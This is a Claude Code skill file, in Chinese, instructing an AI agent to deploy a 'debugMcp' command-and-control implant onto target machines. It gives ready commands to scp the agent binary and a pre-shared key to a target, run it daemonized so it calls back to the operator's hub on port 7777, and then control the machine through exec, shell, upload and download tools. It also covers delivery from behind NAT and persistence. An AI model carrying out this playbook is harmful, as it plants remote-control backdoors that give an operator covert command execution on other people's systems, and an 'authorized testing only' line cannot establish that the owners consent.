---
name: deploy
description: "把 debugMcp C2 agent 投递到目标机器并经 Noise PSK 加密信道回连本机 hub。涵盖架构选择、二进制传输（scp / NAT 后拉取）、运行（daemonize）、回连验证与故障排查。触发场景：(1) 往目标机投递 agent、让目标机回连 hub；(2) 用户说「部署 agent 到目标机」「新增目标机」「让目标机连上 debugmcp」；(3) install 完 hub 后的第一步远程动作。触发短语：部署 debugmcp agent、投递 agent、新增目标机、debugmcp deploy、目标机回连。不触发：本机装 hub（用 install skill）、卸载（用 uninstall skill）、只看状态（直接 debugmcp-cli）。仅用于授权安全测试环境。"
---

# deploy — 投递 agent 到目标机

把 debugMcp C2 **agent** 部署到目标机，使其经 Noise PSK 加密信道（Noise_NNpsk0）回连本机 **hub**（systemd `debugmcp-hub`，监听 `0.0.0.0:7777`）。回连后即可用 Claude Code 的 debugmcp MCP 工具对目标机 `exec` / `shell_*` / `upload` / `download`。

> 仅用于授权安全测试环境。`0.0.0.0:7777` 仅由 PSK 保护，配错即 RCE。

## 资产（随本 plugin 自带，全平台预编译）

| 目标机 | 二进制（plugin 内） |
|---|---|
| Linux x86_64 | `${CLAUDE_PLUGIN_ROOT}/assets/bin/client/linux-amd64/debugmcp-agent` |
| Linux arm64 | `${CLAUDE_PLUGIN_ROOT}/assets/bin/client/linux-arm64/debugmcp-agent` |
| Windows amd64 | `${CLAUDE_PLUGIN_ROOT}/assets/bin/client/windows-amd64/debugmcp-agent.exe` |
| Windows arm64 | `${CLAUDE_PLUGIN_ROOT}/assets/bin/client/windows-arm64/debugmcp-agent.exe` |

源码（仅改了 Go 代码要重编时才需要）：`/home/demo/Desktop/project/debugmcp/mcp-c2`（`./scripts/build.sh assets` 重打）。

## 前置条件

- **hub 在跑**（先跑 `/debugmcp:install`）：`systemctl is-active debugmcp-hub` → active；`ss -tln | grep 7777` 监听 `0.0.0.0:7777`
- **PSK 可读**：`~/.debugmcp/psk.hex`（0600，64 hex = 32 字节）
- **目标机可达**（SSH/scp 或目标机能拉取本机起的临时 HTTP），架构已知（`uname -m`）

## Quick Start（Linux x86_64，主流路径）

```bash
systemctl is-active debugmcp-hub
OP_IP=$(ip -4 -o addr show scope global | awk '{print $4}' | cut -d/ -f1 | head -1)   # 选目标机能访问的 IP
AGENT="${CLAUDE_PLUGIN_ROOT}/assets/bin/client/linux-amd64/debugmcp-agent"
scp "$AGENT" ~/.debugmcp/psk.hex user@target:/tmp/
ssh user@target "chmod +x /tmp/debugmcp-agent && /tmp/debugmcp-agent \
  -hub $OP_IP:7777 -psk-file /tmp/psk.hex -id target-name && rm /tmp/psk.hex"
debugmcp-cli targets        # 验证回连 → 应见 id=target-name, status=online
```

## 步骤

1. **前置检查**：确认 hub active + `0.0.0.0:7777`；选目标机可达的操作者 IP（排除 docker/lxc 桥接 `172.*`/`10.*`/`192.168.122.*`，选物理网卡；跨网用公网 IP）。
2. **选二进制**：`${CLAUDE_PLUGIN_ROOT}/assets/bin/client/<os>-<arch>/debugmcp-agent[.exe]`（`x86_64`→amd64, `aarch64`→arm64）。查目标机架构：`ssh target 'uname -m'`。plugin 没带的架构现场交叉编译——见 [Reference: 交叉编译](docs/REFERENCE.md#交叉编译)。
3. **传输**：scp agent + `psk.hex` 到目标机 `/tmp/`。目标机在 NAT 后时让目标机主动拉取——见 [Reference: NAT 后传输](docs/REFERENCE.md#nat-后传输)。
4. **运行**：`/tmp/debugmcp-agent -hub <OP_IP>:7777 -psk-file /tmp/psk.hex -id <name>`。默认 daemonize（脱离 ssh，断开不影响 agent）。**用 `-psk-file` 而非 `-psk`**，避免 PSK 进 `ps`/history。回连确认后 `rm /tmp/psk.hex`（agent 已加载 PSK 到内存，文件不再需要）。
5. **验证**：`debugmcp-cli targets` 或 MCP `list_targets` → 应见 `id=<name>, status=online`。

## agent 参数

| 参数 | 说明 |
|---|---|
| `-hub` | 操作者 IP:7777（必填） |
| `-psk-file` / `-psk` | PSK hex（必填，二选一。**优先 `-psk-file`**，避免 PSK 进 `ps`/history） |
| `-id` | agent 标识（建议易记名字；留空自动生成） |
| `-no-daemon` | 前台运行（调试用，可看 stderr） |
| `-version` | 打印版本退出 |

默认 **daemonize**：agent 脱离 ssh 会话后台运行，ssh 命令立即返回，断开不影响 agent。

## ⚠️ 安全（必读）

- **PSK 是 C2 注册密钥**，泄露 = 他人可冒充 agent/hub。**切勿**进命令行参数（`ps` 可见）、shell history、日志、git。
- 用 `-psk-file`；目标机落地 `chmod 600`；用完即删。
- agent daemonize 但**目标机重启不自动拉起**（无 systemd unit）；持久化需自行配置并妥善保管 PSK。
- 完整安全分析、故障排查（PSK 不匹配 / 网络不通 / SIGTERM 不退出 / Windows 桩等）见 [Reference](docs/REFERENCE.md)。

## 后续

- 操作目标机：Claude Code 里用 `select_target` + `exec` / `shell_*` / `upload` / `download`
- 看状态：`debugmcp-cli targets` / `debugmcp-cli sessions`
- 卸载本机全套（含 hub）：`/debugmcp:uninstall`（注意：uninstall 不清目标机上的 agent，agent 在目标机上的清理见 [Reference: 目标机清理](docs/REFERENCE.md#目标机清理)）
